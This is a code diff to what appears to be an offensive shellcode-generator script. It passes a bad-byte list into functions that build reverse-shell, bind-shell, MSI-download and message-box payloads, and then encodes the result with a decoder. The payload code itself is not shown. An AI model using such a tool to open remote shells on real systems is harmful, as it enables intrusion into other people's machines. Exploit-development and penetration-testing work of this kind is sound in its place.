@@ -355,10 +355,10 @@ def check_and_disassemble(encoding, bad_bytes):
 
 
 def main(args):
-    bad_ints = []
+    bad_bytes = []
     if args.bad_chars:
         try:
-            bad_ints = parse_badchars_string(args.bad_chars)
+            bad_bytes = parse_badchars_string(args.bad_chars)
         except ValueError:
             print(
                 f"{Fore.RED}[!] Error parsing bad chars. Use string format "
@@ -367,13 +367,13 @@ def main(args):
             sys.exit(1)
 
     if args.msi:
-        shellcode_asm = msi_shellcode(args.lhost, args.lport, args.debug_break)
+        shellcode_asm = msi_shellcode(args.lhost, args.lport, args.debug_break, bad_bytes)
     elif args.messagebox:
-        shellcode_asm = msg_box(args.mb_header, args.mb_text, args.debug_break)
+        shellcode_asm = msg_box(args.mb_header, args.mb_text, args.debug_break, bad_bytes)
     elif args.bind:
-        shellcode_asm = bind_shellcode(args.lport, args.debug_break)
+        shellcode_asm = bind_shellcode(args.lport, args.debug_break, bad_bytes)
     else:
-        shellcode_asm = rev_shellcode(args.lhost, args.lport, args.debug_break)
+        shellcode_asm = rev_shellcode(args.lhost, args.lport, args.debug_break, bad_bytes)
 
     if args.show_asm:
       print(shellcode_asm)
@@ -390,7 +390,7 @@ def main(args):
     if args.key:
         initial_key = parse_key_arg(args.key)
         solved_key, decoder, encoded_shellcode = build_encoded_shellcode(
-            encoding, bad_ints, initial_key, eng
+            encoding, bad_bytes, initial_key, eng
         )
         final_shellcode = decoder + encoded_shellcode
         print_encoding_success(solved_key)
@@ -405,7 +405,7 @@ def main(args):
         final_shellcode = encoding
         abort_on_bad_chars(
             final_shellcode,
-            bad_ints,
+            bad_bytes,
             "WARNING: Final shellcode still contains bad chars!",
             "Shellcode generation aborted due to bad chars.",
         )
